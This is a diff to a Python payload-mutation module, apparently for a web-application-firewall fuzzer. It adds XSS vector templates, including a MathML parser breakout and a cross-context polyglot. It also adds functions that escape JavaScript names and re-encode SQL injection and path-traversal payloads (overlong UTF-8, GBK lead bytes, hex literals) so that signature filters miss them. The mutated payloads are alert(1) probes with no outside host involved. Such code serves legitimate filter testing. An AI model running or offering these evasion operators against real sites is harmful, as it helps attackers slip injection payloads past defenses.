@@ -8,7 +8,6 @@ they are selected and applied randomly/evolutionarily.
 """
 import random
 import re
-import string
 import urllib.parse
 
 
@@ -135,22 +134,47 @@ def xss_event_handler_swap(payload: str) -> str:
     return re.sub(r"on[a-z]+(?=\s*=)", repl, payload, count=1, flags=re.IGNORECASE)
 
 
+_XSS_VECTOR_TEMPLATES = [
+    "<script>{call}</script>",
+    "<img src=x onerror={call}>",
+    "<svg onload={call}>",
+    "<body onload={call}>",
+    "<iframe src=javascript:{call}>",
+    "<details open ontoggle={call}>",
+    "<input autofocus onfocus={call}>",
+    "<select autofocus onfocus={call}>",
+    # MathML integration-point breakout: <mpath> opened inside a <style>
+    # in a <math> context closes the math context, so the trailing <img>
+    # is parsed as a live element and its onerror fires.
+    '<math><mtext></mtext><mglyph><style><mpath href="#</style><img src=x onerror={call}>',
+    # Media elements whose src fails to load fire onerror on their own.
+    "<video src=x onerror={call}>",
+    "<audio src=x onerror={call}>",
+    # <template> content: the inner <svg> still parses an onload handler
+    # via the parser's template-content handling (works in Chrome/FF).
+    "<template><svg onload={call}>",
+    # <data> wraps the <img> so the onerror handler still attaches.
+    "<data><img src=x onerror={call}>",
+    # Legacy form element; type=image renders it and src failure fires onerror.
+    "<isindex type=image src=x onerror={call}>",
+    # Scrolling text: onstart fires as soon as the marquee begins scrolling.
+    "<marquee onstart={call}>",
+    # <meter> with a value above max; onmouseover fires on hover.
+    "<meter value=2 max=1 onmouseover={call}>",
+    # <button formaction=javascript:> submits to a javascript: URL on click.
+    "<form><button formaction=javascript:{call}>",
+]
+
+
 def xss_tag_vector_swap(payload: str) -> str:
     """Swaps the delivery tag/vector while keeping the JS call, e.g.
-    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>."""
+    <script>alert(1)</script> <-> <img src=x onerror=alert(1)> <-> <svg onload=alert(1)>.
+
+    The full vector pool is _XSS_VECTOR_TEMPLATES, shared with the smoke
+    coverage tripwire so the two can't drift apart."""
     m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
     call = m.group(0) if m else "alert(1)"
-    vectors = [
-        f"<script>{call}</script>",
-        f"<img src=x onerror={call}>",
-        f"<svg onload={call}>",
-        f"<body onload={call}>",
-        f"<iframe src=javascript:{call}>",
-        f"<details open ontoggle={call}>",
-        f"<input autofocus onfocus={call}>",
-        f"<select autofocus onfocus={call}>",
-    ]
-    return random.choice(vectors)
+    return random.choice([tmpl.format(call=call) for tmpl in _XSS_VECTOR_TEMPLATES])
 
 
 def xss_attr_breakout(payload: str) -> str:
@@ -166,6 +190,41 @@ def xss_entity_obfuscate(payload: str) -> str:
     out = payload
     out = re.sub(r"javascript:", "javascript&colon;", out, flags=re.IGNORECASE)
     return out
+
+
+def xss_polyglot(payload: str) -> str:
+    """Emit a single canonical cross-context polyglot that fires BOTH in a
+    reflected-attribute context and in a raw tag context.
+
+    The leading `">` closes the (hypothetical) open attribute value AND the
+    enclosing tag; the trailing `<svg/onload=...>` is a minimal SVG vector
+    that runs on parse in a bare HTML context. Because the operator is a pure
+    deterministic transform (no randomness), its exact output is pinned in
+    tools/smoke.py as a regression tripwire.
+    """
+    m = re.search(r"(?:alert|confirm|prompt)\s*\([^)]*\)", payload, re.IGNORECASE)
+    call = m.group(0) if m else "alert(1)"
+    return f'"><svg/onload={call}>'
+
+
+def xss_js_char_escape(payload: str) -> str:
+    """Escape the letters of any JS function name (alert/confirm/prompt) to
+    unicode \\uNNNN escapes so a signature rule matching the literal `alert(`
+    misses it; the leading letter stays literal, the rest is escaped, and the
+    argument list plus everything else are untouched, so the result is still
+    valid, behaviourally-identical JS (`a\\u006c\\u0065\\u0072\\u0074` ==
+    `alert`). Applies to every occurrence of the three names. Deterministic
+    (pure transform), so its exact output is pinned in tools/smoke.py."""
+    def _escape(s: str) -> str:
+        return s[0] + "".join(f"\\u{ord(c):04x}" for c in s[1:])
+    for name in ("alert", "confirm", "prompt"):
+        payload = re.sub(
+            r"\b" + name + r"\b",
+            lambda m: _escape(m.group(0)),
+            payload,
+            flags=re.IGNORECASE,
+        )
+    return payload
 
 
 def lfi_nested_traversal(payload: str) -> str:
@@ -221,6 +280,52 @@ def sql_inline_comment_split(payload: str) -> str:
     return payload.replace(" ", "/**/", 1) if " " in payload else payload
 
 
+def overlong_utf8(payload: str) -> str:
+    """Overlong UTF-8 for space (-> %c0%a0) and single-quote (-> %c0%a7).
+
+    The two-byte overlong forms decode to 0x20 (space) and 0x27 (quote)
+    respectively; byte-oriented signature rules that only match the
+    single-byte form let them through while the server reassembles the
+    original byte.
+    """
+    return payload.replace(" ", "%c0%a0").replace("'", "%c0%a7")
+
+
+def gbk_overlong(payload: str) -> str:
+    """GBK multi-byte for space (-> %df%20) and single-quote (-> %df%27).
+
+    0xdf is a valid GBK lead byte (0x81-0xFE); a server decoding a
+    GBK/GB18030 parameter reads lead+trail as one character, so %df%27
+    hides the quote from byte-oriented rules while the query still parses.
+    """
+    return payload.replace(" ", "%df%20").replace("'", "%df%27")
+
+
+def backslash_insert_sql(payload: str) -> str:
+    """Insert a backslash before SQL structural chars (space, =, <, >, (, ), ')."""
+    structural = " =<>()'"
+    return "".join(("\\" + ch) if ch in structural else ch for ch in payload)
+
+
+def sql_hex_string_literal(payload: str) -> str:
+    """Rewrite each single-quoted literal as a 0x-hex blob (quotes dropped).
+
+    Only matched single-quoted pairs are rewritten; a trailing/unmatched
+    quote (degenerate input) is left untouched, so the operator never
+    corrupts the byte stream. In MySQL 0x<hex> is a BINARY literal equal
+    to the original string bytes, so comparisons still match while
+    quoted-string/keyword signatures miss it.
+    """
+    def _hex(m: "re.Match[str]") -> str:
+        return "0x" + "".join(f"{ord(c):02x}" for c in m.group(1))
+    return re.sub(r"'([^']*)'", _hex, payload)
+
+
+def uri_case_fold(payload: str) -> str:
+    """Fold %XX to lowercase hex for case-sensitive percent-encoding rules."""
+    return re.sub(r"%[0-9A-Fa-f]{2}", lambda m: "%" + m.group(0)[1:].lower(), payload)
+
+
 ALL_MUTATIONS = [
     case_randomize,
     add_sql_comment,
@@ -237,6 +342,8 @@ ALL_MUTATIONS = [
     xss_tag_vector_swap,
     xss_attr_breakout,
     xss_entity_obfuscate,
+    xss_polyglot,
+    xss_js_char_escape,
     mysql_versioned_comment,
     whitespace_alt,
     sql_inline_comment_split,
@@ -244,6 +351,11 @@ ALL_MUTATIONS = [
     lfi_encode_traversal,
     lfi_double_encode_traversal,
     lfi_depth_vary,
+    overlong_utf8,
+    gbk_overlong,
+    backslash_insert_sql,
+    sql_hex_string_literal,
+    uri_case_fold,
 ]
 
 
@@ -252,19 +364,21 @@ OPERATORS_BY_CATEGORY = {
         case_randomize, add_whitespace_variants, insert_random_junk,
         html_entity_encode, url_encode_partial, script_null_byte_split,
         xss_event_handler_swap, xss_tag_vector_swap, xss_attr_breakout,
-        xss_entity_obfuscate,
+        xss_entity_obfuscate, xss_polyglot, xss_js_char_escape, uri_case_fold,
     ],
     "sqli": [
         case_randomize, add_sql_comment, add_whitespace_variants,
         url_encode_partial, insert_random_junk, unicode_homoglyph,
         script_null_byte_split, add_null_byte, double_url_encode,
         strip_and_reencode, mysql_versioned_comment, whitespace_alt,
-        sql_inline_comment_split,
+        sql_inline_comment_split, overlong_utf8, gbk_overlong,
+        backslash_insert_sql, sql_hex_string_literal, uri_case_fold,
     ],
     "lfi": [
         lfi_nested_traversal, lfi_encode_traversal, lfi_double_encode_traversal,
         lfi_depth_vary, url_encode_partial, add_null_byte, case_randomize,
-        insert_random_junk, strip_and_reencode,
+        insert_random_junk, strip_and_reencode, overlong_utf8, gbk_overlong,
+        uri_case_fold,
     ],
     "generic": ALL_MUTATIONS,
 }
